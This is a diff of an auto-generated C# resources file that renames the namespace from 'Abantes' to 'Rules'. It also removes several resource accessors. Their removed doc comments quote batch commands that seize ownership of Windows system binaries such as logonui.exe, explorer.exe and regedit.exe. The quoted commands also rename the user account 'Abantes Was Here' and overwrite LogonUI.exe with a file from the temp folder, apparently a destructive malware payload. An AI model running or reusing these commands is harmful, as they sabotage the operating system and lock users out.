@@ -8,7 +8,7 @@
 // </auto-generated>
 //------------------------------------------------------------------------------
 
-namespace Abantes.Properties {
+namespace Rules.Properties {
     using System;
     
     
@@ -39,7 +39,7 @@ namespace Abantes.Properties {
         internal static global::System.Resources.ResourceManager ResourceManager {
             get {
                 if (object.ReferenceEquals(resourceMan, null)) {
-                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Abantes.Properties.Resources", typeof(Resources).Assembly);
+                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Rules.Properties.Resources", typeof(Resources).Assembly);
                     resourceMan = temp;
                 }
                 return resourceMan;
@@ -61,57 +61,12 @@ namespace Abantes.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to @echo on
-        ///cd\&amp;cd Windows\System32
-        ///takeown /f logonui.exe
-        ///icacls logonui.exe /granted %username%:F
-        ///cd\&amp;cd Windows
-        ///takeown /f explorer.exe
-        ///takeown /f regedit.exe
-        ///takeown /f HelpPane.exe
-        ///takeown /f &quot;C:\Windows\Temp&quot; /r /d y
-        ///icacls &quot;C:\Windows\Temp&quot; /granted %username%:F /T /C
-        ///icacls regedit.exe /granted %username%:F
-        ///icacls explorer.exe /granted %username%:F
-        ///icacls HelpPane.exe /granted %username%:F
-        ///wmic useraccount where name=&apos;%username%&apos; set FullName=&apos;Abantes Was Here&apos;
-        ///wmic useraccount where name [rest of string was truncated]&quot;;.
+        ///   Looks up a localized resource of type System.Drawing.Bitmap.
         /// </summary>
-        internal static string Action {
+        internal static System.Drawing.Bitmap RulesBackground {
             get {
-                return ResourceManager.GetString("Action", resourceCulture);
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        internal static byte[] creepy_mouse {
-            get {
-                object obj = ResourceManager.GetObject("creepy_mouse", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        internal static byte[] icon {
-            get {
-                object obj = ResourceManager.GetObject("icon", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized string similar to @echo on
-        ///cd\
-        ///copy %temp%\LogonUIStart.exe &quot;C:\Windows\system32\LogonUI.exe&quot; /Y
-        ///copy %temp%\LogonUi.exe &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
-        /// </summary>
-        internal static string LogonOverwrite {
-            get {
-                return ResourceManager.GetString("LogonOverwrite", resourceCulture);
+                object obj = ResourceManager.GetObject("RulesBackground", resourceCulture);
+                return ((System.Drawing.Bitmap)(obj));
             }
         }
     }
